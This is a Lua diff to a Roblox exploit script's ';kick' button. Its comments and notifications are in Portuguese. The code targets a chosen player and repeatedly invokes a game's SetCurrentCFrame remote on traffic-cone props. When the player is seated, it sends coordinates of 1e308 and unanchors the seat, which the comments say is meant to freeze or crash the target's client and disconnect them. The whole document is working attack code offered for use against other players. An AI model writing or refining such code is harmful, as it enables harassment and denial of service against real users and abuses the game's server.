@@ -505,64 +505,105 @@ MainTab:Button({
     Title = ";kick",
     Callback = function()
         if AlvoSelecionado ~= "" then
+            local Players = game:GetService("Players")
             local WorkspaceCom = workspace:FindFirstChild("WorkspaceCom")
-            local targetPlayer = nil
             
-            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
+            -- Busca o jogador alvo pelo nome ou Nick no Dropdown
+            local targetPlayer = nil
+            for _, player in pairs(Players:GetPlayers()) do
                 if string.find(string.lower(player.Name), string.lower(AlvoSelecionado)) or string.find(string.lower(player.DisplayName), string.lower(AlvoSelecionado)) then
                     targetPlayer = player
                     break
                 end
             end
             
-            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            if targetPlayer then
                 local trafficCones = WorkspaceCom and WorkspaceCom:FindFirstChild("001_TrafficCones")
                 
                 if trafficCones then
                     WindUI:Notify({
-                        Title = "🌀 Ataque de Arrasto Iniciado", 
-                        Content = "Puxando " .. targetPlayer.Name .. " para a zona de colapso físico...", 
+                        Title = "🔨 Punição Avançada", 
+                        Content = "Monitorando " .. targetPlayer.Name .. ". Aguardando colapso de assento...", 
                         Duration = 3
                     })
 
+                    -- Reseta o loop anterior caso já estivesse rodando
+                    if _G.PunishAtivo then 
+                        _G.PunishAtivo = false 
+                        task.wait(0.1) 
+                    end
+                    _G.PunishAtivo = true
+
                     task.spawn(function()
-                        -- Loop persistente e sem botão de parar
-                        while targetPlayer and targetPlayer.Parent == game:GetService("Players") and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") do
+                        while _G.PunishAtivo and targetPlayer and targetPlayer.Parent == Players and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") do
+                            local character = targetPlayer.Character
+                            local targetHRP = character.HumanoidRootPart
+                            local humanoid = character:FindFirstChildOfClass("Humanoid")
+                            
+                            -- Se o alvo morrer, interrompe o loop
+                            if humanoid and humanoid.Health <= 0 then
+                                break
+                            end
+                            
+                            -- Posição padrão: segue a CFrame do jogador alvo
+                            local destinoPunishCFrame = targetHRP.CFrame
+                            
+                            -- Verifica se o jogador está sentado (Seat, Vehicle ou SeatPart)
+                            if humanoid and (humanoid.Sit or character:FindFirstChild("Seat") or character:FindFirstChild("VehicleSeat") or humanoid.SeatPart) then
+                                
+                                -- 🌀 COORDENADA DE LIMITE ABSOLUTO (Infinito Exponencial)
+                                -- Força o travamento e congelamento completo do cliente/jogo
+                                destinoPunishCFrame = CFrame.new(1e308, 1e308, 1e308)
+                                
+                                -- Tenta desancorar a cadeira/veículo para permitir o teletransporte forçado
+                                local cadeiraFisica = humanoid.SeatPart or character:FindFirstChild("Seat") or character:FindFirstChild("VehicleSeat")
+                                if cadeiraFisica and cadeiraFisica:IsA("BasePart") then
+                                    pcall(function()
+                                        if cadeiraFisica.Anchored then
+                                            cadeiraFisica.Anchored = false
+                                        end
+                                    end)
+                                end
+                            end
+                            
                             local props = trafficCones:GetChildren()
+                            
                             if #props > 0 then
                                 for _, prop in pairs(props) do
+                                    -- Trava de segurança caso o loop seja desligado
+                                    if not _G.PunishAtivo or not (targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")) then break end
+                                    
                                     local setCFrameRemote = prop:FindFirstChild("SetCurrentCFrame")
                                     if setCFrameRemote and setCFrameRemote:IsA("RemoteFunction") then
-                                        
-                                        -- Coordenada de Limite Absoluto (Infinito Exponencial)
-                                        -- Força o teletransporte físico por sobreposição contínua
-                                        local crashCFrame = CFrame.new(1e308, 1e308, 1e308)
-                                        
                                         task.spawn(function()
                                             pcall(function()
-                                                setCFrameRemote:InvokeServer(crashCFrame)
+                                                setCFrameRemote:InvokeServer(destinoPunishCFrame)
                                             end)
                                         end)
                                     end
                                 end
                             end
-                            task.wait(0.01) -- Velocidade máxima de atualização para não dar chance de fuga
+                            task.wait(0.1) 
                         end
                         
-                        WindUI:Notify({
-                            Title = "✅ Alvo Desconectado", 
-                            Content = "O jogador sumiu do servidor (Client Crashed).", 
-                            Duration = 5
-                        })
+                        -- Notifica o fim da execução se o player sumir do servidor
+                        if _G.PunishAtivo then
+                            WindUI:Notify({
+                                Title = "✅ Execução Concluída", 
+                                Content = "O alvo foi desconectado ou o assento colapsou com sucesso.", 
+                                Duration = 5
+                            })
+                            _G.PunishAtivo = false
+                        end
                     end)
                 else
                     WindUI:Notify({Title = "❌ Erro", Content = "Pasta 001_TrafficCones não encontrada.", Duration = 3})
                 end
             else
-                WindUI:Notify({Title = "❌ Erro", Content = "Jogador não encontrado no mapa.", Duration = 3})
+                WindUI:Notify({Title = "❌ Erro", Content = "Jogador não encontrado.", Duration = 3})
             end
         else
-            WindUI:Notify({ Title = "⚠️ Aviso", Content = "Por favor, selecione um alvo primeiro no Dropdown!", Duration = 4 })
+            WindUI:Notify({Title = "⚠️ Aviso", Content = "Por favor, selecione um alvo primeiro no Dropdown!", Duration = 4})
         end
     end
 })
